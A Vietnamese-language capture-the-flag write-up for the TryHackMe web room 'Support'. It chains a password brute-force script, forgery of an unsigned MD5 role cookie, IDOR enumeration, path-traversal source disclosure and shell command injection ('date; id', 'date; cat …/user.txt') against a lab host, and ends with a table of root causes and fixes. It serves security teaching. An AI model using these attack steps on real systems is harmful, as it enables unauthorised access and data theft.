# Support

| | |
|---|---|
| **Platform** | TryHackMe |
| **Link** | https://tryhackme.com/room/support |
| **Độ khó** | Medium |
| **Chủ đề** | Web |
| **Ngày** | 13/06/2026 |

---

## Mô tả

Ứng dụng web helpdesk nội bộ viết bằng PHP. Có 5 lỗ hổng liên tiếp: brute-force credential, cookie forgery để leo lên IT role, IDOR trên API để tìm admin, LFI để đọc source code, và command injection để lấy RCE.

---

## Trinh sát

### Quét cổng

```bash
nmap -sV -Pn 10.48.167.122
```

| Cổng | Dịch vụ | Phiên bản |
|------|---------|-----------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.58 (Ubuntu) |

Linux box, chỉ có SSH và web. SSH khó bruteforce trên THM do network policy nên tập trung vào HTTP trước.

### Liệt kê Web

```bash
ffuf -u http://10.48.167.122/FUZZ \
  -w /path/to/SecLists/Discovery/Web-Content/common.txt \
  -e .php,.txt,.bak,.old \
  -mc 200,301,302,403
```

| Path | HTTP | Ghi chú |
|------|------|---------|
| `/index.php` | 200 | Login panel |
| `/dashboard.php` | 302 | Redirect về login nếu chưa auth |
| `/api.php` | 302 | Redirect về login |
| `/footer.php` | 200 | Render trực tiếp, thấy form diagnostics |
| `/config.php` | 200 | Trả trang trắng |
| `/info.php` | 200 | phpinfo() lộ toàn bộ config server |
| `/skins/` | 200 | Thư mục chứa theme PHP |

`/info.php` lộ ra công khai là lỗi cấu hình nghiêm trọng. Thu được: PHP 8.3, `session.serialize_handler = php`, `session.upload_progress.enabled = On`, `session.use_strict_mode = Off`, `display_errors = Off`, session dir `/var/lib/php/sessions`.

---

## Khai thác

### Bước 1 — Brute-force tài khoản helpdesk

Form login dùng **email** thay vì username, server không có username enum (luôn trả "Invalid credentials" khi sai). Tên miền là `support.thm` nên đoán pattern email theo vai trò: `help@support.thm`, `admin@support.thm`, `it@support.thm`, v.v.

Thử các email đó kết hợp với wordlist top-1000 darkweb:

```python
import requests

emails = [
    "help@support.thm",
    "admin@support.thm",
    "support@support.thm",
    "it@support.thm",
]

with open("darkweb2017_top-1000.txt") as f:
    passwords = [l.strip() for l in f]

for email in emails:
    for pw in passwords:
        r = requests.post("http://10.48.167.122/",
                          data={"email": email, "password": pw},
                          allow_redirects=False)
        if r.status_code == 302:
            print(f"[+] {email}:{pw}")
```

Tìm được credential cho tài khoản helpdesk thông thường (`admin = false`). Mật khẩu nằm trong top 1000 darkweb, kiểu tài khoản service test thường dùng password đơn giản.

---

### Bước 2 — Cookie forgery: leo lên IT Admin role

Sau khi đăng nhập, server set 2 cookie:
- `PHPSESSID` — session ID bình thường
- `isITUser=68934a3e9455fa72420237eb05902327`

Giá trị `isITUser` có 32 ký tự hex, trông như MD5. Kiểm tra:

```python
import hashlib
print(hashlib.md5(b"false").hexdigest())  # 68934a3e9455fa72420237eb05902327
print(hashlib.md5(b"true").hexdigest())   # b326b5062b2f0e69046810717534cb09
```

Đúng là `md5("false")`. Server dùng hash này để đánh dấu user không phải IT, nhưng cookie không được ký (không có HMAC hay signature) nên bất kỳ ai cũng có thể tự tính `md5("true")` và thay vào. Đổi cookie thành `b326b5062b2f0e69046810717534cb09`:

```bash
curl -s -b 'PHPSESSID=<sid>; isITUser=b326b5062b2f0e69046810717534cb09' \
  http://10.48.167.122/dashboard.php
```

Dashboard hiện thêm link **"IT Admin Panel"** trỏ đến `/api.php`.

---

### Bước 3 — IDOR trên API: tìm tài khoản admin

`/api.php` hiển thị profile của user hiện tại dưới dạng JSON. URL tự chuyển thành `/user/3` — con số 3 là ID database của mình. Nếu `/user/3` trả về profile của mình thì thử `/user/1`, `/user/2` xem sao. Server không kiểm tra ownership:

```bash
for i in 1 2 3 4 5; do
  echo "=== /user/$i ==="
  curl -s -b 'PHPSESSID=<sid>; isITUser=b326b5062b2f0e69046810717534cb09' \
    "http://10.48.167.122/user/$i"
  echo
done
```

```json
// /user/1
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}

// /user/2
{
    "email": "IT@support.thm",
    "2FA": false,
    "admin": false
}
```

`specialadmin@support.thm` là tài khoản admin duy nhất. API luôn `unset($user['password'])` trước khi trả JSON nên mật khẩu không lộ trực tiếp.

---

### Bước 4 — LFI: đọc source code qua tham số `skin`

Dashboard có tham số `?skin=default` để chọn theme. File theme nằm trong `/var/www/html/skins/default.php`. Thử path traversal:

```bash
curl -s -b 'PHPSESSID=<sid>; isITUser=b326b5062b2f0e69046810717534cb09' \
  'http://10.48.167.122/dashboard.php?skin=../index'
```

Server trả về toàn bộ PHP source của `index.php`. Lý do đọc được source thay vì bị parse: `dashboard.php` dùng `readfile()`, không phải `include()`. `readfile()` chỉ xuất nội dung file thô, PHP không parse nên `<?php ... ?>` hiện nguyên văn.

Logic kiểm tra path:

```php
$webRoot = realpath('/var/www/html/skins');
$another = realpath('/var/www/html');
$requested = realpath($webRoot . '/' . $skin . '.php');

if ($requested !== false && strpos($requested, $another) === 0) {
    readfile($requested);
}
```

`strpos($requested, '/var/www/html') === 0` giới hạn chỉ đọc file trong `/var/www/html`. Không đọc được `/var/www/db.php` hay `/etc/passwd`, nhưng đủ để lấy toàn bộ source code trong web root.

| File đọc được | Thông tin thu được |
|------|---------------------|
| `../index` | DB include từ `/var/www/db.php` (ngoài web root), login dùng `===` strict comparison |
| `../config` | `$MASTER_PASSWORD = 'support@110'` |
| `../api` | IDOR xác nhận, password luôn bị `unset()` |
| `../footer` | Command injection qua `sys` param, chỉ check prefix `date` |
| `../dashboard` | Logic role/session, web flag ở `/var/www/web.txt` |

`config.php` lộ:

```php
<?php
$MASTER_PASSWORD = 'support@110';
$SITE_VER  = '1.0';
$SITE_NAME = 'support_portal';
```

Tên biến `MASTER_PASSWORD` gợi ý đây là mật khẩu cấp cao. Thử thẳng `support@110` với `specialadmin@support.thm` thì sai. `support@110` rõ ràng là hint, password thực trong `db.php` là biến thể của chuỗi này (bỏ ký tự đặc biệt: `support110`). Sau khi thử các biến thể, đăng nhập thành công:

```bash
specialadmin@support.thm : <mật_khẩu_admin>
```

Dashboard admin hiển thị **Web Flag** đọc từ `/var/www/web.txt`.

---

### Bước 5 — Command injection: lấy User Flag

Source `footer.php` đọc được qua LFI:

```php
<?php
$isAdmin = $_SESSION['admin'];

if ($isAdmin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys'])) {
    $selectedSys = $_POST['sys'];
    $sys = $_POST['sys'];
    if (strpos($sys, 'date') === 0) {
        $output = shell_exec($sys);
    } else {
        $error = 'Only date command is allowed.';
    }
}
```

`strpos($sys, 'date') === 0` chỉ kiểm tra chuỗi **bắt đầu** bằng `date`, không sanitize phần còn lại. Nối lệnh bằng `;` là đủ để bypass: `date; id` thỏa điều kiện nhưng shell vẫn chạy cả `id`. Yêu cầu duy nhất là `$_SESSION['admin'] = true`, tức phải đang dùng session của `specialadmin`.

```bash
curl -s -X POST \
  -b 'PHPSESSID=<admin_sid>; isITUser=b326b5062b2f0e69046810717534cb09' \
  http://10.48.167.122/dashboard.php \
  -d 'sys=date; id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s -X POST \
  -b 'PHPSESSID=<admin_sid>; isITUser=b326b5062b2f0e69046810717534cb09' \
  http://10.48.167.122/dashboard.php \
  -d 'sys=date; cat /home/ubuntu/user.txt'
```

Process chạy dưới `www-data` nhưng `/home/ubuntu/` world-readable nên đọc được `user.txt`.

---

## Leo thang đặc quyền

Room không yêu cầu root. Hai flag nằm ở `/var/www/web.txt` (đọc qua dashboard admin session) và `/home/ubuntu/user.txt` (đọc qua command injection). Để lấy full shell có thể dùng injection để reverse shell hoặc write SSH key, nhưng không cần thiết cho mục tiêu room.

---

## Cờ

> Giá trị thực không được ghi vào write-up.

| Cờ | Vị trí | Cách lấy |
|----|--------|----------|
| Web Flag | `/var/www/web.txt` | Đăng nhập admin, xem dashboard |
| User Flag | `/home/ubuntu/user.txt` | `date; cat /home/ubuntu/user.txt` |

---

## Bài học

| Lỗ hổng | Gốc rễ | Fix |
|---------|--------|-----|
| Weak credential | Mật khẩu đơn giản cho account service | Enforce strong password, lockout |
| Cookie role forgery | Dùng MD5(string) không ký làm authorization token | Lưu role trong server-side session, không dùng cookie |
| IDOR | Không verify ownership trước khi truy xuất object | Check `session_user_id == requested_id` hoặc RBAC |
| LFI / source disclosure | `readfile()` với path user-controlled, check yếu | Whitelist skin name, không ghép path từ input |
| Command injection | `shell_exec()` với input không sanitize | Dùng `escapeshellarg()` và whitelist, tránh gọi shell với user input |
